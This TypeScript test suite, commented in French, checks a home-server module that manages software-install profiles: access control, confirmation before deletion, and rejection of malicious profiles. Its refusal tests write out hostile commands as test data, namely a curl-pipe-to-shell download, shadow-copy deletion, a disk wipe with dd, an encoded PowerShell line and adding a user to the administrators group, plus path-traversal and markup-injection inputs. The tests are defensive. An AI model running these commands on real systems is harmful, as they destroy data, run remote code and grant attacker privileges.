// Genèse · Systèmes, lot S4 (côté serveur) : les PROFILS de logiciels, communs à la clé USB, au réseau et aux machines
// virtuelles, gardés par Odin. Créer, enregistrer, renommer, dupliquer, supprimer (avec confirmation) ; gardés et relus
// par un autre Odin sur le même dossier ; un profil piégé (énorme, noms bizarres, fichier d'un autre système, script
// dangereux) est refusé ; les scripts sont revérifiés à chaque lecture ; ni un membre, ni une automatisation, ni la clé
// d'API, ni une tablette « maison ». Données fausses, dossiers temporaires neufs, aucun réseau.
import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';
import * as T from '../src/valhalla/modules/thjalfi.ts';
import type { Module } from '../src/valhalla/types.ts';

const X = T as unknown as Record<string, any>;
const dossiers: string[] = [];
const neuf = (n: string) => { const d = mkdtempSync(join(tmpdir(), `odin-s4-${n}-`)); dossiers.push(d); return d; };
after(() => { for (const d of dossiers) rmSync(d, { recursive: true, force: true }); });

const WIN = { logiciels: [{ id: 'firefox', fichier: 'Firefox-Setup-faux.exe', nom: 'Firefox' }, { id: 'vlc', fichier: 'vlc-faux.exe', nom: 'VLC' }], scripts: [{ nom: 'heure.cmd', contenu: 'echo %TIME%' }] };
const DEB = { logiciels: [{ id: 'gimp', fichier: 'gimp-faux.deb', nom: 'GIMP' }], scripts: [{ nom: 'bonjour.sh', contenu: 'echo bonjour' }] };
const SYS = () => JSON.parse(JSON.stringify({ windows: WIN, debian: DEB, fedora: { logiciels: [], scripts: [] } }));

async function odin(home: string) {
  const { Valhalla } = await import('../src/valhalla/service.ts');
  const v = new Valhalla(home, [X.thjalfi() as Module], { fetch: (async () => { throw new Error('aucun réseau'); }) as never, run: async () => ({ code: 1, out: '', err: 'aucune commande' }), notify: async () => {} });
  await v.activer('thjalfi', true);
  return v;
}
type R = { ok: boolean; text: string; data?: any; confirm?: string };

test('S4 · deux actions, propriétaire seul : lire les profils (lecture) et les changer (écriture, supprimer = grave)', () => {
  assert.equal(typeof X.profilsLogicielsActions, 'function', 'profilsLogicielsActions exporté par modules/thjalfi.ts');
  const acts = X.thjalfi().actions as Array<Record<string, any>>;
  const lire = acts.find((a) => a.id === 'profils_logiciels'), ecrire = acts.find((a) => a.id === 'profil_logiciels');
  assert.ok(lire && ecrire);
  assert.equal(lire.read, true); assert.equal(lire.proprietaireSeul, true);
  assert.notEqual(ecrire.read, true); assert.equal(ecrire.proprietaireSeul, true);
  assert.equal(ecrire.grave({ op: 'renommer' }), undefined);
  assert.match(ecrire.grave({ op: 'supprimer', id: 'p-00000000' }), /supprimer le profil/);
});

test('S4 · profils : créer, enregistrer, dupliquer, renommer, supprimer — gardés et relus par un autre Odin', async () => {
  const home = neuf('home');
  const v = await odin(home);
  try {
    let r = await v.act('thjalfi', 'profils_logiciels', {}) as R;
    assert.equal(r.ok, true); assert.deepEqual(r.data.profils, [], 'aucun profil au départ');
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'creer', nom: '  Bureau  ', systemes: SYS() }) as R;
    assert.equal(r.ok, true, r.text);
    const id = r.data.choisi as string;
    assert.match(id, /^p-[a-f0-9]+$/);
    const p = r.data.profils.find((x: any) => x.id === id);
    assert.equal(p.nom, 'Bureau', 'nom ramené à sa forme simple');
    assert.deepEqual(p.systemes.windows.logiciels.map((l: any) => l.fichier), ['Firefox-Setup-faux.exe', 'vlc-faux.exe'], 'l\'ordre d\'installation est gardé');
    assert.equal(p.systemes.windows.logiciels[0].silencieux, true, '« tout seul » recalculé par Odin');
    assert.equal(p.systemes.windows.scripts[0].ok, true, 'le script est passé par l\'antivirus');
    // Enregistrer : l'ordre change (VLC d'abord) — ce que la page envoie, rien d'autre.
    const sys2 = SYS(); sys2.windows.logiciels.reverse();
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'enregistrer', id, systemes: sys2 }) as R;
    assert.equal(r.ok, true, r.text);
    // Dupliquer : « Bureau (copie) », puis « Bureau (copie 2) ».
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'dupliquer', id }) as R;
    assert.equal(r.ok, true, r.text);
    const copie = r.data.profils.find((x: any) => x.id === r.data.choisi);
    assert.equal(copie.nom, 'Bureau (copie)'); assert.notEqual(copie.id, id);
    assert.deepEqual(copie.systemes.windows.logiciels.map((l: any) => l.fichier), ['vlc-faux.exe', 'Firefox-Setup-faux.exe']);
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'dupliquer', id }) as R;
    assert.equal(r.data.profils.find((x: any) => x.id === r.data.choisi).nom, 'Bureau (copie 2)');
    const copie2 = r.data.choisi as string;
    // Renommer ; un nom déjà pris est refusé (sans tenir compte des majuscules).
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'renommer', id: copie.id, nom: 'Développeur' }) as R;
    assert.equal(r.ok, true, r.text);
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'renommer', id: copie2, nom: 'bureau' }) as R;
    assert.equal(r.ok, false); assert.match(r.text, /s'appelle déjà/);
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'creer', nom: 'BUREAU' }) as R;
    assert.equal(r.ok, false); assert.match(r.text, /s'appelle déjà/);
    // Supprimer.
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'supprimer', id: copie2 }) as R;
    assert.equal(r.ok, true, r.text);
    assert.deepEqual(r.data.profils.map((x: any) => x.nom), ['Bureau', 'Développeur']);
    r = await v.act('thjalfi', 'profil_logiciels', { op: 'supprimer', id: copie2 }) as R;
    assert.equal(r.ok, false, 'déjà supprimé');
  } finally { v.stop(); }
  // Un autre Odin, sur le même dossier : tout est relu tel quel.
  const v2 = await odin(home);
  try {
    const r = await v2.act('thjalfi', 'profils_logiciels', {}) as R;
    assert.equal(r.ok, true);
    assert.deepEqual(r.data.profils.map((x: any) => x.nom), ['Bureau', 'Développeur']);
    assert.deepEqual(r.data.profils[0].systemes.windows.logiciels.map((l: any) => l.fichier), ['vlc-faux.exe', 'Firefox-Setup-faux.exe'], 'l\'ordre enregistré est relu');
    assert.deepEqual(r.data.profils[0].systemes.debian.scripts.map((s: any) => s.nom), ['bonjour.sh']);
  } finally { v2.stop(); }
});

test('S4 · supprimer demande la confirmation par la porte de la page (action grave)', async () => {
  const home = neuf('grave');
  const v = await odin(home);
  try {
    const r = await v.act('thjalfi', 'profil_logiciels', { op: 'creer', nom: 'À garder' }) as R;
    const id = r.data.choisi;
    const { setValhalla } = await import('../src/valhalla/odin.ts');
    const { valhallaPost } = await import('../src/web/valhalla-api.ts');
    setValhalla(v);
    const sans = await valhallaPost('/api/valhalla/act', { module: 'thjalfi', action: 'profil_logiciels', input: { op: 'supprimer', id } }, { sessionProprio: true }) as R;
    assert.equal(sans.ok, false); assert.match(String(sans.confirm), /supprimer le profil de logiciels « À garder »/);
    assert.equal(((await v.act('thjalfi', 'profils_logiciels', {})) as R).data.profils.length, 1, 'rien n\'est supprimé sans la confirmation');
    const avec = await valhallaPost('/api/valhalla/act', { module: 'thjalfi', action: 'profil_logiciels', input: { op: 'supprimer', id }, confirm: true }, { sessionProprio: true }) as R;
    assert.equal(avec.ok, true, avec.text);
    assert.equal(((await v.act('thjalfi', 'profils_logiciels', {})) as R).data.profils.length, 0);
  } finally { v.stop(); }
});

test('S4 · un profil piégé est refusé côté serveur, sans rien garder à moitié', async () => {
  const home = neuf('piege');
  const v = await odin(home);
  try {
    const refus = async (input: Record<string, unknown>, re: RegExp) => { const r = await v.act('thjalfi', 'profil_logiciels', input) as R; assert.equal(r.ok, false, `refusé : ${JSON.stringify(input).slice(0, 120)}`); assert.match(r.text, re); };
    // Noms bizarres : vide, trop long, caractères invisibles ou de sens d'écriture, retour à la ligne.
    for (const nom of ['', '   ', 'x'.repeat(61), 'Bu\u202ereau', 'Bu\u200breau', 'a\nb', 'a\u0000b', 42]) await refus({ op: 'creer', nom }, /nom de 1 à 60/);
    // Énorme : plus de 512 Ko, trop de logiciels, trop de scripts.
    const gros = SYS(); gros.debian.scripts = [{ nom: 'gros.sh', contenu: 'echo a\n'.repeat(80_000) }];
    await refus({ op: 'creer', nom: 'Gros', systemes: gros }, /trop gros/);
    const trop = SYS(); trop.windows.logiciels = Array.from({ length: 201 }, (_x, k) => ({ id: `l${k}`, fichier: `l${k}.msi`, nom: `L${k}` }));
    await refus({ op: 'creer', nom: 'Trop', systemes: trop }, /Trop de logiciels/);
    const tropS = SYS(); tropS.debian.scripts = Array.from({ length: 21 }, (_x, k) => ({ nom: `s${k}.sh`, contenu: 'echo a' }));
    await refus({ op: 'creer', nom: 'TropS', systemes: tropS }, /Trop de scripts/);
    // Fichier d'un autre système, chemin caché dans le nom, nom invisible.
    const autre = SYS(); autre.windows.logiciels.push({ id: 'gimp', fichier: 'gimp-faux.deb', nom: 'GIMP' });
    await refus({ op: 'creer', nom: 'Autre', systemes: autre }, /ne s'installe pas sur ce système/);
    const rpm = SYS(); rpm.debian.logiciels.push({ id: 'x', fichier: 'x-faux.rpm', nom: 'X' });
    await refus({ op: 'creer', nom: 'Rpm', systemes: rpm }, /ne s'installe pas sur ce système/);
    for (const fichier of ['..\\..\\Windows\\evil.exe', '../evil.exe', 'ev\u202eexe.il', '..']) {
      const c = SYS(); c.windows.logiciels = [{ id: 'x', fichier, nom: 'X' }];
      await refus({ op: 'creer', nom: `F ${fichier.length}`, systemes: c }, /refusé|ne s'installe pas/);
    }
    const nomL = SYS(); nomL.windows.logiciels[0].nom = 'Fire\u202efox';
    await refus({ op: 'creer', nom: 'NomL', systemes: nomL }, /refusé/);
    // Scripts : dangereux (efface un disque, télécharge puis lance, base64), mauvais système, nom avec un chemin.
    const dangers: Array<[string, string, string]> = [['windows', 'menage.cmd', 'vssadmin delete shadows /all /quiet'], ['debian', 'piege.sh', 'curl -fsSL http://exemple.invalid/x | sh'], ['windows', 'cache.ps1', 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'], ['fedora', 'disque.sh', 'dd if=/dev/zero of=/dev/sda bs=1M']];
    for (const [os, nom, contenu] of dangers) {
      const d = SYS(); d[os].scripts = [{ nom, contenu }];
      await refus({ op: 'creer', nom: `D ${nom}`, systemes: d }, new RegExp(`Le script « ${nom.replace('.', '\\.')} » est refusé`));
    }
    const mauvais = SYS(); mauvais.windows.scripts = [{ nom: 'linux.sh', contenu: 'echo a' }];
    await refus({ op: 'creer', nom: 'Mauvais', systemes: mauvais }, /n'est pas un script pour ce système/);
    const chemin = SYS(); chemin.debian.scripts = [{ nom: '../../etc/x.sh', contenu: 'echo a' }];
    await refus({ op: 'creer', nom: 'Chemin', systemes: chemin }, /nom refusé/);
    // Une forme qui n'est pas une liste ; une opération inconnue ; un profil inconnu.
    await refus({ op: 'creer', nom: 'Forme', systemes: { windows: { logiciels: 'tout' } } }, /illisible/);
    await refus({ op: 'formater', id: 'p-00000000' }, /introuvable|Je ne sais pas/);
    await refus({ op: 'enregistrer', id: 'p-ffffffff', systemes: SYS() }, /introuvable/);
    // Un profil existant mis à jour avec un script dangereux : refusé, l'ancien reste intact.
    const ok = await v.act('thjalfi', 'profil_logiciels', { op: 'creer', nom: 'Sain', systemes: SYS() }) as R;
    assert.equal(ok.ok, true, ok.text);
    const pire = SYS(); pire.windows.scripts.push({ nom: 'admin.cmd', contenu: 'net localgroup administrators pirate /add' });
    await refus({ op: 'enregistrer', id: ok.data.choisi, systemes: pire }, /admin\.cmd/);
    const relu = await v.act('thjalfi', 'profils_logiciels', {}) as R;
    assert.deepEqual(relu.data.profils.map((x: any) => x.nom), ['Sain'], 'seul le profil sain existe');
    assert.deepEqual(relu.data.profils[0].systemes.windows.scripts.map((s: any) => s.nom), ['heure.cmd']);
    // Un nom de profil ou de logiciel est du TEXTE : gardé tel quel, jamais interprété.
    const html = SYS(); html.windows.logiciels[0].nom = '<img src=x onerror=alert(1)>';
    const h = await v.act('thjalfi', 'profil_logiciels', { op: 'creer', nom: '<b>Gras</b>', systemes: html }) as R;
    assert.equal(h.ok, true, h.text);
    assert.equal(h.data.profils.find((x: any) => x.id === h.data.choisi).nom, '<b>Gras</b>');
  } finally { v.stop(); }
});

test('S4 · les scripts d\'un profil sont revérifiés à chaque lecture (un fichier changé à la main ne passe pas)', async () => {
  const home = neuf('relu');
  const v = await odin(home);
  try {
    const r = await v.act('thjalfi', 'profil_logiciels', { op: 'creer', nom: 'Bureau', systemes: SYS() }) as R;
    assert.equal(r.ok, true);
    // Quelqu'un modifie le fichier gardé : un script dangereux, un profil abîmé (mauvais identifiant, nom invisible).
    const dir = v.ctx('thjalfi').dir, f = join(dir, 'profils-logiciels.json');
    const brut = JSON.parse(readFileSync(f, 'utf8'));
    brut.profils[0].systemes.windows.scripts.push({ nom: 'menage.cmd', contenu: 'vssadmin delete shadows /all /quiet' });
    brut.profils.push({ id: '../../x', nom: 'Abîmé', systemes: {} }, { id: 'p-0123456789ab', nom: 'Ca\u202eché', systemes: {} });
    writeFileSync(f, JSON.stringify(brut));
    const l = await v.act('thjalfi', 'profils_logiciels', {}) as R;
    assert.deepEqual(l.data.profils.map((x: any) => x.nom), ['Bureau'], `un profil abîmé est laissé de côté : ${JSON.stringify(l.data.profils.map((x: any) => [x.id, x.nom]))}`);
    const scripts = l.data.profils[0].systemes.windows.scripts;
    assert.deepEqual(scripts.map((s: any) => [s.nom, s.ok]), [['heure.cmd', true], ['menage.cmd', false]]);
    assert.match(scripts[1].raison, /effacer un disque|antivirus/);
    // Le dupliquer ne recopie pas le script refusé en silence.
    const d = await v.act('thjalfi', 'profil_logiciels', { op: 'dupliquer', id: l.data.profils[0].id }) as R;
    assert.equal(d.ok, false); assert.match(d.text, /menage\.cmd/);
    // Et l'enregistrer tel quel est refusé.
    const e = await v.act('thjalfi', 'profil_logiciels', { op: 'enregistrer', id: l.data.profils[0].id, systemes: l.data.profils[0].systemes }) as R;
    assert.equal(e.ok, false); assert.match(e.text, /menage\.cmd/);
  } finally { v.stop(); }
});

test('S4 · ni un membre, ni une automatisation, ni Odin seul, ni la clé d\'API : refusés, rien ne fuit', async () => {
  const home = neuf('acces');
  const v = await odin(home);
  try {
    const cree = await v.act('thjalfi', 'profil_logiciels', { op: 'creer', nom: 'Secret', systemes: SYS() }) as R;
    assert.equal(cree.ok, true);
    for (const qui of [{ qui: 'member' as const }, { qui: 'guest' as const }, { auto: true }, { by: 'automatisation' as const }, { by: 'odin' as const }]) {
      for (const [action, input] of [['profils_logiciels', {}], ['profil_logiciels', { op: 'creer', nom: 'Intrus' }], ['profil_logiciels', { op: 'supprimer', id: cree.data.choisi }]] as const) {
        const n = await v.act('thjalfi', action, input, qui) as R;
        assert.equal(n.ok, false, `${action} ${JSON.stringify(qui)}`); assert.match(n.text, /propriétaire|accord/);
        assert.equal(n.data, undefined, 'rien ne fuit');
      }
    }
    const { setValhalla } = await import('../src/valhalla/odin.ts');
    const { valhallaPost } = await import('../src/web/valhalla-api.ts');
    setValhalla(v);
    for (const [action, input] of [['profils_logiciels', {}], ['profil_logiciels', { op: 'creer', nom: 'Intrus' }]] as const) {
      const api = await valhallaPost('/api/valhalla/act', { module: 'thjalfi', action, input }) as R & { code?: string };
      assert.equal(api.ok, false); assert.equal(api.code, 'proprietaire'); assert.equal(api.data, undefined);
    }
    const l = await v.act('thjalfi', 'profils_logiciels', {}) as R;
    assert.deepEqual(l.data.profils.map((x: any) => x.nom), ['Secret'], 'rien n\'a été créé ni supprimé');
  } finally { v.stop(); }
});

test('S4 · une tablette « maison » ne lit ni ne change les profils (bouton de sa page refusé)', async () => {
  const { T: Banc } = await import('./banc/lib.ts');
  const { vraiOdin } = await import('./banc/odin-vrai.ts');
  const { allModules, valhallaOf } = await import('../src/valhalla/odin.ts');
  const tt = new Banc(), orig = { log: console.log, error: console.error, warn: console.warn };
  for (const k of ['log', 'error', 'warn'] as const) console[k] = () => {};
  try {
    const od = await vraiOdin(tt, { compte: true, modules: (o) => allModules(o).filter((m) => ['gladsheim', 'thjalfi'].includes(m.id)) });
    const va = valhallaOf()!;
    const f = await va.act('gladsheim', 'regler_fenetre', { fenetre: JSON.stringify({ pages: [{ id: 'a1b2c3d4', name: 'Maison', maison: true, widgets: [
      { id: 'b0000001', kind: 'bouton', w: 1, module: 'thjalfi', action: 'profils_logiciels', label: 'Profils', input: {} },
      { id: 'b0000002', kind: 'bouton', w: 1, module: 'thjalfi', action: 'profil_logiciels', label: 'Nouveau', input: { op: 'creer', nom: 'Tablette' } },
    ] }] }) });
    assert.equal(f.ok, true, f.text);
    const cle = ((await va.act('gladsheim', 'cle_tablette', { nom: 'Tablette entrée', droits: 'maison' })).data as { key: string }).key;
    for (const id of ['b0000001', 'b0000002']) {
      const r = await od.json('/api/maison/fenetre', { id }, { cookie: '', 'x-odin-maison': cle });
      assert.notEqual(r.body.ok, true, JSON.stringify(r.body));
      assert.equal(r.body.data, undefined);
    }
    const p = await od.json('/api/valhalla/act', { module: 'thjalfi', action: 'profils_logiciels', input: {} });
    assert.equal(p.body.ok, true, JSON.stringify(p.body).slice(0, 300));
    assert.deepEqual((p.body.data as { profils: unknown[] }).profils, [], 'la tablette n\'a rien créé');
  } finally { await tt.end(); Object.assign(console, orig); }
});

test('S4 · nomDeCopie : un nom libre, jamais plus de 60 caractères', () => {
  assert.equal(X.nomDeCopie('A', []), 'A (copie)');
  assert.equal(X.nomDeCopie('A', ['a (copie)', 'A (COPIE 2)']), 'A (copie 3)');
  const long = X.nomDeCopie('x'.repeat(60), []);
  assert.ok([...long].length <= 60); assert.match(long, / \(copie\)$/);
});
